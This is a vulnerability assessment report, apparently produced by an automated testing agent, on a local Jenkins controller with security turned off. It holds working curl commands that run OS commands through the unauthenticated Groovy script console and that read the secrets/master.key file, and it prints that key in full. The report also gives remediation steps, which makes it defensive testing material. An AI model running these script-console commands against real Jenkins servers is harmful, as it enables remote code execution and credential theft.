# Vulnerability Assessment Report — jenkins

**Campaign:** camp_20260801_b6ad197d  
**Specialist agent:** jenkins  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  
**Note:** assembled from the agent's pushed findings (complete evidence per finding). The compiled server generator could not serve this campaign (stale-reconciler / data-dependent 500 — see e2e notes).

## MANAGEMENT SUMMARY

**Overall posture:** 🔴 CRITICAL — 3 findings (3 critical, 0 high, 0 medium, 0 low).

## 1. FINDINGS TABLE

| # | Title | Severity | Status | CVSS | MITRE |
|---|-------|----------|--------|------|-------|
| 1 | Unauthenticated Full Administrative Access to Jenkins Controller | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:N/ | T1190 |
| 2 | Unauthenticated Remote Code Execution via Groovy Script Console | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:N/ | T1059.007 |
| 3 | Jenkins Master Encryption Key and Secret Key Exfiltrated via Script Co | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:N/ | T1552.001 |

## 2. VULNERABILITY DETAILS — ONE SECTION PER FINDING

### 1. [CRITICAL / exploited] Unauthenticated Full Administrative Access to Jenkins Controller

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **MITRE ATT&CK:** T1190 Exploit Public-Facing Application
- **ISO 27001:** A.9.4.1
- **Component:** Jenkins Core Security Configuration

**Description**

Jenkins 2.541.3 is configured with security completely disabled. The SecurityRealm is set to 'hudson.security.SecurityRealm$None' (no authentication) and AuthorizationStrategy is 'hudson.security.AuthorizationStrategy$Unsecured' (no authorization). The setup wizard was explicitly disabled via JAVA_OPTS=-Djenkins.install.runSetupWizard=false. This means ANY anonymous user has full administrative access including the Groovy Script Console (/scriptText), which provides direct Remote Code Execution on the controller host. The /api/json endpoint confirms useSecurity:false, and the /whoAmI/api/json endpoint confirms the user is 'anonymous' with full authenticated access.

**Technical Analysis**

The Jenkins controller at http://127.0.0.1:8080 is deployed with all security mechanisms disabled. Both authentication (SecurityRealm) and authorization (AuthorizationStrategy) are set to their most permissive 'None'/'Unsecured' variants. The setup wizard, which would normally prompt the administrator to configure security on first launch, was explicitly disabled via the JAVA_OPTS environment variable. As a result, any network-reachable client has full administrative control over the Jenkins controller, including the ability to execute arbitrary Groovy code, read/write all configurations, manage credentials, and trigger builds. This was confirmed by accessing /api/json which returned useSecurity:false, and /whoAmI which showed the anonymous user is treated as fully authenticated.

**Exploitation Commands**

```
curl -sS --max-time 15 "http://127.0.0.1:8080/api/json?pretty=true"
curl -sS --max-time 15 "http://127.0.0.1:8080/whoAmI/api/json?pretty=true"
```

**Raw Request**

```
GET /api/json?pretty=true HTTP/1.1
Host: 127.0.0.1:8080
```

**Raw Response**

```
HTTP/1.1 200 OK
X-Jenkins: 2.541.3
Content-Type: application/json;charset=utf-8

{"_class":"hudson.model.Hudson","mode":"NORMAL","useSecurity":false,"useCrumbs":true,...}
```

**Evidence / Logs**

```
/api/json response contains: "useSecurity" : false
/whoAmI response: {"anonymous":true,"authenticated":true,"authorities":["anonymous"],"name":"anonymous"}
config.xml confirms: <authorizationStrategy class="hudson.security.AuthorizationStrategy$Unsecured"/>
config.xml confirms: <securityRealm class="hudson.security.SecurityRealm$None"/>
JAVA_OPTS=-Djenkins.install.runSetupWizard=false (setup wizard deliberately skipped)
```

**Remediation**

1. Enable security immediately: set SecurityRealm to HudsonPrivateSecurityRealm or LDAP, and AuthorizationStrategy to [REDACTED] or Matrix-based. 2. Remove -Djenkins.install.runSetupWizard=false from JAVA_OPTS. 3. Create an admin account and restrict anonymous access. 4. Place Jenkins behind a reverse proxy with authentication. 5. Restrict network access to the Jenkins port (8080) and JNLP agent port (50000).

---

### 2. [CRITICAL / exploited] Unauthenticated Remote Code Execution via Groovy Script Console

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **MITRE ATT&CK:** T1059.007 Command and Scripting Interpreter: JavaScript/JScript
- **ISO 27001:** A.12.6.1
- **Component:** Jenkins Script Console (Groovy)

**Description**

The Jenkins Groovy Script Console at /scriptText is accessible without any authentication due to the Unsecured authorization strategy. An attacker can POST arbitrary Groovy scripts that execute as the 'jenkins' user (uid=1000) on the controller host (Debian 13 trixie, Docker container hostname 2ab63d87d5d7). RCE was proven by executing 'id', 'whoami', 'hostname', 'cat /etc/os-release', and 'cat /etc/passwd' through the script console. The only requirement is a valid CSRF crumb obtained from /crumbIssuer/api/json, which is also accessible anonymously. The crumb must be submitted with the session cookie obtained during the crumb request.

**Technical Analysis**

The Jenkins Groovy Script Console provides a direct mechanism for arbitrary code execution on the Jenkins controller JVM and the underlying operating system. Without any authentication or authorization controls, an anonymous attacker can submit Groovy scripts via HTTP POST to /scriptText that execute OS commands using Groovy's '.execute()' method. This was exploited end-to-end by: (1) obtaining a CSRF crumb and session cookie from /crumbIssuer/api/json, (2) POSTing Groovy code 'println "id".execute().text' to /scriptText with the crumb header and session cookie, and (3) receiving the command output 'uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)' confirming code execution as the jenkins user. The container runs Debian 13 (trixie) with hostname 2ab63d87d5d7, confirming it's a Docker container initialized by tini.

**Exploitation Commands**

```
COOKIEJAR=/tmp/jenkins_cookies.txt; rm -f $COOKIEJAR
CRUMB=$(curl -sS --max-time 10 -c $COOKIEJAR "http://127.0.0.1:8080/crumbIssuer/api/json" | jq -r ".crumb")
curl -sS --max-time 15 -b $COOKIEJAR -H "Jenkins-Crumb: $CRUMB" --data-urlencode 'script=println "id".execute().text' "http://127.0.0.1:8080/scriptText"
curl -sS --max-time 15 -b $COOKIEJAR -H "Jenkins-Crumb: $CRUMB" --data-urlencode 'script=println "whoami".execute().text' "http://127.0.0.1:8080/scriptText"
curl -sS --max-time 15 -b $COOKIEJAR -H "Jenkins-Crumb: $CRUMB" --data-urlencode 'script=println "hostname".execute().text' "http://127.0.0.1:8080/scriptText"
```

**Raw Request**

```
POST /scriptText HTTP/1.1
Host: 127.0.0.1:8080
Cookie: JSESSIONID.be40abd9=node0esfkiw4n5j3rvdq8orkdzwyi11.node0
Jenkins-Crumb: 76d0a3de30fa5f34a4db61432d1ba7c2d3ce0556cf2e88715cfe1f471a33c9f2
Content-Type: application/x-www-form-urlencoded

script=println+%22id%22.execute%28%29.text
```

**Raw Response**

```
HTTP/1.1 200 OK
Server: Jetty(12.1.5)
X-Content-Type-Options: nosniff
Content-Type: text/plain;charset=utf-8

uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

**Evidence / Logs**

```
id output: uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
whoami output: jenkins
hostname output: 2ab63d87d5d7
os-release output: PRETTY_NAME="Debian GNU/Linux 13 (trixie)" NAME="Debian GNU/Linux" VERSION_ID="13" VERSION="13 (trixie)"
/etc/passwd last line: jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
Process 1 cmdline: /usr/bin/tini -- /usr/local/bin/jenkins.sh (Docker container confirmed)
```

**Remediation**

1. Enable authentication and authorization on the Jenkins controller immediately. 2. Restrict Script Console access to only trusted administrators via Matrix-based authorization. 3. Consider disabling the script console entirely if not needed. 4. Network-segment the Jenkins controller behind a firewall. 5. Enable audit logging for all script console executions.

---

### 3. [CRITICAL / exploited] Jenkins Master Encryption Key and Secret Key Exfiltrated via Script Console

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **MITRE ATT&CK:** T1552.001 Unsecured Credentials: Credentials In Files
- **ISO 27001:** A.10.1.1
- **Component:** Jenkins Secrets/Encryption Infrastructure

**Description**

Using the unauthenticated Groovy Script Console, the Jenkins master encryption key (secrets/master.key) and the secret.key file were exfiltrated. The master.key is a 256-byte hex-encoded key used to decrypt hudson.util.Secret, which in turn decrypts all credentials stored in Jenkins. The secret.key is a 64-character hex key used for HMAC operations. Additionally, the crumb salt binary file was exfiltrated. While the hudson.util.Secret file does not exist on this instance (no credentials plugin installed), possession of master.key would allow offline decryption of any future credentials added. The full directory listing of /var/jenkins_home/secrets/ and /var/jenkins_home/ was also obtained, revealing the internal structure of the Jenkins home directory.

**Technical Analysis**

The Jenkins encryption infrastructure consists of master.key (used to derive the AES key that decrypts hudson.util.Secret) and secret.key (used for HMAC operations). Both were read through the unauthenticated script console using Groovy File I/O. The master.key is 256 hex characters (128 bytes) and is the root-of-trust for all credential encryption in Jenkins. While this instance doesn't currently have the Credentials plugin installed (hence no hudson.util.Secret file), the exfiltrated master.key means that if credentials are ever added, they can be decrypted offline by an attacker who obtained this key. The secret.key (64 hex chars) is used for HMAC signing operations. Together, these keys compromise the cryptographic foundation of the entire Jenkins instance.

**Exploitation Commands**

```
curl -sS --max-time 15 -b $CJ -H "Jenkins-Crumb: $CR" --data-urlencode 'script=println(new File(Jenkins.instance.rootDir, "secrets/master.key").text)' "http://127.0.0.1:8080/scriptText"
curl -sS --max-time 15 -b $CJ -H "Jenkins-Crumb: $CR" --data-urlencode 'script=println(new File("/var/jenkins_home/secret.key").text)' "http://127.0.0.1:8080/scriptText"
```

**Raw Request**

```
POST /scriptText HTTP/1.1
Host: 127.0.0.1:8080
Jenkins-Crumb: [crumb]
Cookie: JSESSIONID.be40abd9=[session]

script=println(new File(Jenkins.instance.rootDir, "secrets/master.key").text)
```

**Raw Response**

```
HTTP/1.1 200 OK
Content-Type: text/plain;charset=utf-8

a06e197fcbb9a385f3e6e9cfaf1e9a7040bd472cea6d38286a3188e2fe80e97f96021d6b13e97828a1e03c3161ca9c0d635203edc75bff46d16ee9329dae6d9d02c1c320d274a73a176e1f2d5a5b612ae3486c1dafaa13ffd904516016f23e6429629339dad76d7648ebf3cd66939b4c21cc7215c2465e6a184fcefe19b87905
```

**Evidence / Logs**

```
master.key: a06e197fcbb9a385f3e6e9cfaf1e9a7040bd472cea6d38286a3188e2fe80e97f96021d6b13e97828a1e03c3161ca9c0d635203edc75bff46d16ee9329dae6d9d02c1c320d274a73a176e1f2d5a5b612ae3486c1dafaa13ffd904516016f23e6429629339dad76d7648ebf3cd66939b4c21cc7215c2465e6a184fcefe19b87905
secret.key: [REDACTED]
Secrets directory listing: jenkins.model.Jenkins.crumbSalt (32 bytes), hudson.model.User.DIRNAMES (48 bytes), master.key (256 bytes), jenkins.security.csp.ReportingContext.key (48 bytes)
hudson.util.Secret: NOT PRESENT (no credentials plugin installed)
```

**Remediation**

1. Rotate the master.key and secret.key by stopping Jenkins, deleting the files, and restarting (Jenkins will regenerate them). 2. Re-encrypt all credentials after key rotation. 3. Restrict file system access to JENKINS_HOME/secrets/ to only the Jenkins service account. 4. Enable authentication to prevent unauthenticated script console access.

---
